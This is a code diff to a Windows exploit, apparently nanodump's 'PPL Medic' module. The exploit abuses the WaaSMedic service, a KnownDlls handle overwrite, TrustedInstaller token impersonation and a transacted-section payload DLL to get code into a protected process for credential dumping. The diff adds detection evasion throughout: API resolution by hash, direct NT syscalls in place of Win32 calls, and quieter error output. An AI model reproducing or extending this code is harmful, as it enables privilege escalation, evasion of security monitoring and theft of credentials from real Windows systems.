@@ -37,6 +37,7 @@ BOOL run_ppl_medic_exploit(
     PFILE_LIST TemporaryDiretoriesAfter     = NULL;
     DWORD64    WriteAtLaunchDetectionOnly   = 0;
     DWORD64    WriteAtLaunchRemediationOnly = 0;
+    ULONG32    i                            = 0;
 
     PIWaaSRemediationEx IWaaSRemediationEx = NULL;
 
@@ -115,7 +116,7 @@ BOOL run_ppl_medic_exploit(
     success = get_known_dlls_handle_address(&KnownDllDirectoryHandleAddr);
     if (!success)
     {
-        PRINT_ERR("Failed to determine the address of LdrpKnownDllDirectoryHandle");
+        DPRINT_ERR("Failed to determine the address of LdrpKnownDllDirectoryHandle");
         goto cleanup;
     }
 
@@ -212,7 +213,7 @@ BOOL run_ppl_medic_exploit(
 
     DPRINT("Trying to write a valid object directory handle...");
 
-    for (int i = 0; i < MAX_ATTEMPTS; i++)
+    for (i = 0; i < MAX_ATTEMPTS; i++)
     {
         if ((i + 1) % 100 == 0)
         {
@@ -233,7 +234,7 @@ BOOL run_ppl_medic_exploit(
         {
             if (!is_service_running(STR_WAASMEDIC_SVC))
             {
-                PRINT_ERR("Service %ls is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
+                DPRINT_ERR("Service %ls is no longer running, it probably crashed because of an invalid handle value.", STR_WAASMEDIC_SVC);
                 goto cleanup;
             }
         }
@@ -247,6 +248,15 @@ BOOL run_ppl_medic_exploit(
     }
 
 cleanup:
+    if (!ret_val && i >= MAX_ATTEMPTS)
+    {
+        PRINT_ERR("Reached the maximum number of attempts.");
+    }
+    else if (!ret_val)
+    {
+        PRINT_ERR("The exploit failed abruptly.");
+    }
+
     if (StateRegTypeLibModified)
     {
         modify_type_lib_registry_value(
@@ -323,6 +333,18 @@ BOOL create_load_event(
     BOOL   ret_val                   = FALSE;
     LPWSTR ProxyStubDllLoadEventName = NULL;
 
+    CreateEventW_t CreateEventW = NULL;
+
+    CreateEventW = (CreateEventW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateEventW_SW2_HASH,
+        0);
+    if (!CreateEventW)
+    {
+        api_not_found("CreateEventW");
+        goto cleanup;
+    }
+
     ProxyStubDllLoadEventName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
     if (!ProxyStubDllLoadEventName)
     {
@@ -354,6 +376,18 @@ BOOL delete_type_lib(
     BOOL ret_val = FALSE;
     BOOL success = FALSE;
 
+    DeleteFileW_t DeleteFileW = NULL;
+
+    DeleteFileW = (DeleteFileW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        DeleteFileW_SW2_HASH,
+        0);
+    if (!DeleteFileW)
+    {
+        api_not_found("DeleteFileW");
+        goto cleanup;
+    }
+
     success = DeleteFileW(TypeLibPath);
     if (!success)
     {
@@ -379,8 +413,20 @@ BOOL unlock_plugin_dll(
     BOOL ret_val = FALSE;
     BOOL success = FALSE;
 
+    UnlockFile_t UnlockFile = NULL;
+
     if (!WaaSMedicCapsuleHandle)
         return TRUE;
+
+    UnlockFile = (UnlockFile_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        UnlockFile_SW2_HASH,
+        0);
+    if (!UnlockFile)
+    {
+        api_not_found("UnlockFile");
+        goto cleanup;
+    }
 
     success = UnlockFile(WaaSMedicCapsuleHandle, 0, 0, 4096, 0);
     if (!success)
@@ -491,6 +537,18 @@ cleanup:
 BOOL is_proxy_stub_dll_loaded(
     IN HANDLE ProxyStubDllLoadEventHandle)
 {
+    WaitForSingleObject_t WaitForSingleObject = NULL;
+
+    WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        WaitForSingleObject_SW2_HASH,
+        0);
+    if (!WaitForSingleObject)
+    {
+        api_not_found("WaitForSingleObject");
+        return FALSE;
+    }
+
     return WaitForSingleObject(ProxyStubDllLoadEventHandle, 0) == WAIT_OBJECT_0;
 }
 
@@ -505,7 +563,39 @@ BOOL enumerate_temporary_directories(
     PFILE_LIST       file_list         = NULL;
     PFILE_LIST       current_file      = NULL;
 
-    // TODO: dinvoke
+    FindFirstFileW_t FindFirstFileW = NULL;
+    FindNextFileW_t  FindNextFileW  = NULL;
+    FindClose_t      FindClose      = NULL;
+
+    FindFirstFileW = (FindFirstFileW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        FindFirstFileW_SW2_HASH,
+        0);
+    if (!FindFirstFileW)
+    {
+        api_not_found("FindFirstFileW");
+        goto cleanup;
+    }
+
+    FindNextFileW = (FindNextFileW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        FindNextFileW_SW2_HASH,
+        0);
+    if (!FindNextFileW)
+    {
+        api_not_found("FindNextFileW");
+        goto cleanup;
+    }
+
+    FindClose = (FindClose_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        FindClose_SW2_HASH,
+        0);
+    if (!FindClose)
+    {
+        api_not_found("FindClose");
+        goto cleanup;
+    }
 
     if (!pfile_list)
         return FALSE;
@@ -570,7 +660,39 @@ BOOL get_waa_s_medic_capsule_path(
     BOOL   success        = FALSE;
     LPWSTR pwszModulePath = NULL;
 
-    // TODO: add dinvoke
+    GetSystemDirectoryW_t  GetSystemDirectoryW  = NULL;
+    GetWindowsDirectoryW_t GetWindowsDirectoryW = NULL;
+    GetFileAttributesW_t   GetFileAttributesW   = NULL;
+
+    GetSystemDirectoryW = (GetSystemDirectoryW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetSystemDirectoryW_SW2_HASH,
+        0);
+    if (!GetSystemDirectoryW)
+    {
+        api_not_found("GetSystemDirectoryW");
+        goto cleanup;
+    }
+
+    GetWindowsDirectoryW = (GetWindowsDirectoryW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetWindowsDirectoryW_SW2_HASH,
+        0);
+    if (!GetWindowsDirectoryW)
+    {
+        api_not_found("GetWindowsDirectoryW");
+        goto cleanup;
+    }
+
+    GetFileAttributesW = (GetFileAttributesW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetFileAttributesW_SW2_HASH,
+        0);
+    if (!GetFileAttributesW)
+    {
+        api_not_found("GetFileAttributesW");
+        goto cleanup;
+    }
 
     //
     // Path on Windows 10: c:\windows\System32\WaaSMedicCapsule.dll
@@ -613,7 +735,7 @@ BOOL get_waa_s_medic_capsule_path(
 
         if ((GetFileAttributesW(pwszModulePath) == INVALID_FILE_ATTRIBUTES) && (GetLastError() == ERROR_FILE_NOT_FOUND))
         {
-            PRINT_ERR("Failed to determine file path for file: %ls", STR_WAASMEDIC_CAPSULE);
+            DPRINT_ERR("Failed to determine file path for file: %ls", STR_WAASMEDIC_CAPSULE);
             goto cleanup;
         }
     }
@@ -634,6 +756,29 @@ BOOL lock_plugin_dll(
 {
     BOOL ret_val = FALSE;
     BOOL success = FALSE;
+
+    CreateFileW_t CreateFileW  = NULL;
+    LockFile_t    LockFile     = NULL;
+
+    CreateFileW = (CreateFileW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateFileW_SW2_HASH,
+        0);
+    if (!CreateFileW)
+    {
+        api_not_found("CreateFileW");
+        goto cleanup;
+    }
+
+    LockFile = (LockFile_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        LockFile_SW2_HASH,
+        0);
+    if (!LockFile)
+    {
+        api_not_found("LockFile");
+        goto cleanup;
+    }
 
     if (!*StatePluginDllLocked)
     {
@@ -799,7 +944,7 @@ BOOL modify_proxy_stub_registry_value(
     if (StateRegProxyStubModified)
         *StateRegProxyStubModified = FALSE;
 
-    success = impersonate_trusted_installer(hTI);
+    success = impersonate(hTI);
     if (!success)
         goto cleanup;
     bImpersonated = TRUE;
@@ -817,7 +962,7 @@ cleanup:
     if (bImpersonated) RevertToSelf();
     if (!ret_val)
     {
-        PRINT_ERR("Failed to write Proxy/Stub DLL to registry: %ls", ProxyStubRegValuePath);
+        DPRINT_ERR("Failed to write Proxy/Stub DLL to registry: %ls", ProxyStubRegValuePath);
     }
 
     return ret_val;
@@ -831,7 +976,30 @@ BOOL create_dummy_dll_file(
     BOOL   success      = FALSE;
     LPWSTR pwszFilePath = NULL;
     HANDLE hFile        = NULL;
-    
+
+    CreateFileW_t          CreateFileW          = NULL;
+    GetWindowsDirectoryW_t GetWindowsDirectoryW = NULL;
+
+    CreateFileW = (CreateFileW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateFileW_SW2_HASH,
+        0);
+    if (!CreateFileW)
+    {
+        api_not_found("CreateFileW");
+        goto cleanup;
+    }
+
+    GetWindowsDirectoryW = (GetWindowsDirectoryW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetWindowsDirectoryW_SW2_HASH,
+        0);
+    if (!GetWindowsDirectoryW)
+    {
+        api_not_found("GetWindowsDirectoryW");
+        goto cleanup;
+    }
+
     pwszFilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
     if (!pwszFilePath)
     {
@@ -896,10 +1064,10 @@ BOOL map_payload_dll(
     HANDLE            hFileTransacted = NULL;
     LPVOID            pDllData        = NULL;
     DWORD             dwDllSize       = 0;
-    DWORD             dwBytesWritten  = 0;
     UNICODE_STRING    SectionName     = { 0 };
     OBJECT_ATTRIBUTES oa              = { 0 };
     NTSTATUS          status          = ERROR_SUCCESS;
+    IO_STATUS_BLOCK   IoStatusBlock   = { 0 };
 
     CreateFileTransactedW_t  CreateFileTransactedW = NULL;
 
@@ -913,7 +1081,6 @@ BOOL map_payload_dll(
         goto cleanup;
     }
 
-    // TODO: add dinvoke
     pDllData  = nanodump_ppl_medic_dll;
     dwDllSize = nanodump_ppl_medic_dll_len;
 
@@ -951,10 +1118,19 @@ BOOL map_payload_dll(
         goto cleanup;
     }
 
-    success = WriteFile(hFileTransacted, pDllData, dwDllSize, &dwBytesWritten, NULL);
-    if (!success)
+    status = NtWriteFile(
+        hFileTransacted,
+        NULL,
+        NULL,
+        NULL,
+        &IoStatusBlock,
+        pDllData,
+        dwDllSize,
+        NULL,
+        NULL);
+    if (!NT_SUCCESS(status))
     {
-        function_failed("WriteFile");
+        syscall_failed("NtWriteFile", status);
         goto cleanup;
     }
 
@@ -991,7 +1167,7 @@ cleanup:
 
     if (!ret_val)
     {
-        PRINT_ERR("Failed to create section: %ls", HijackedDllSectionPath);
+        DPRINT_ERR("Failed to create section: %ls", HijackedDllSectionPath);
     }
 
     return ret_val;
@@ -1044,10 +1220,13 @@ BOOL get_trusted_installer_token(
     BOOL                        bImpersonation = FALSE;
     DWORD                       dwTiSvcStatus  = 0;
     DWORD                       dwTiSvcPid     = 0;
-    HANDLE                      hSnapshot      = INVALID_HANDLE_VALUE, hThread = NULL;
+    HANDLE                      hSnapshot      = INVALID_HANDLE_VALUE;
+    HANDLE                      hThread        = NULL;
     THREADENTRY32               ThreadEntry    = { 0 };
     SECURITY_QUALITY_OF_SERVICE Qos            = { 0 };
     NTSTATUS                    status         = STATUS_SUCCESS;
+    CLIENT_ID                   cid            = { 0 };
+    OBJECT_ATTRIBUTES           obj_attr       = { 0 };
     LPCWSTR ppwszRequiredPrivileges[2] = {
         L"SeDebugPrivilege",
         L"SeImpersonatePrivilege"
@@ -1057,6 +1236,8 @@ BOOL get_trusted_installer_token(
     Thread32First_t            Thread32First            = NULL;
     Thread32Next_t             Thread32Next             = NULL;
     RevertToSelf_t             RevertToSelf             = NULL;
+
+    InitializeObjectAttributes(&obj_attr, NULL, 0, 0, NULL);
 
     CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)(ULONG_PTR)get_function_address(
         get_library_address(KERNEL32_DLL, TRUE),
@@ -1141,9 +1322,23 @@ BOOL get_trusted_installer_token(
         if (ThreadEntry.th32OwnerProcessID == dwTiSvcPid)
         {
             // TODO: switch to syscall
-            hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, ThreadEntry.th32ThreadID);
-            if (hThread != NULL)
+            cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwTiSvcPid;
+            cid.UniqueThread  = (HANDLE)(ULONG_PTR)ThreadEntry.th32ThreadID;
+
+            status = NtOpenThread(
+                &hThread,
+                THREAD_DIRECT_IMPERSONATION,
+                &obj_attr,
+                &cid);
+            if (!NT_SUCCESS(status))
+            {
+                syscall_failed("NtOpenThread", status);
+                hThread = NULL;
+            }
+            else
+            {
                 break;
+            }
         }
 
     } while (Thread32Next(hSnapshot, &ThreadEntry));
@@ -1167,10 +1362,16 @@ BOOL get_trusted_installer_token(
 
     bImpersonation = TRUE;
 
-    // TODO: use syscall equivalent
-    success = OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, hTI);
-    if (!success)
+    status = NtOpenThreadToken(
+        NtGetCurrentThread(),
+        TOKEN_IMPERSONATE,
+        FALSE,
+        hTI);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtOpenThreadToken", status);
         goto cleanup;
+    }
 
     ret_val = TRUE;
 
@@ -1185,29 +1386,6 @@ cleanup:
     return ret_val;
 }
 
-BOOL impersonate_trusted_installer(
-    IN HANDLE hTI)
-{
-    BOOL   ret_val = FALSE;
-    HANDLE hThread = NULL;
-    BOOL   success = FALSE;
-
-    hThread = NtGetCurrentThread();
-
-    // TODO: use syscall equivalent
-    success = SetThreadToken(&hThread, hTI);
-    if (!success)
-    {
-        function_failed("SetThreadToken");
-        goto cleanup;
-    }
-
-    ret_val = TRUE;
-
-cleanup:
-    return ret_val;
-}
-
 BOOL modify_type_lib_registry_value(
     IN LPWSTR TypeLibPath,
     IN LPWSTR TypeLibRegValuePath,
@@ -1218,10 +1396,22 @@ BOOL modify_type_lib_registry_value(
     BOOL success       = FALSE;
     BOOL bImpersonated = FALSE;
 
+    RevertToSelf_t RevertToSelf = NULL;
+
+    RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
+        get_library_address(ADVAPI32_DLL, TRUE),
+        RevertToSelf_SW2_HASH,
+        0);
+    if (!RevertToSelf)
+    {
+        api_not_found("RevertToSelf");
+        return FALSE;
+    }
+
     if(StateRegTypeLibModified)
         *StateRegTypeLibModified = FALSE;
 
-    success = impersonate_trusted_installer(hTI);
+    success = impersonate(hTI);
     if (!success)
         goto cleanup;
 
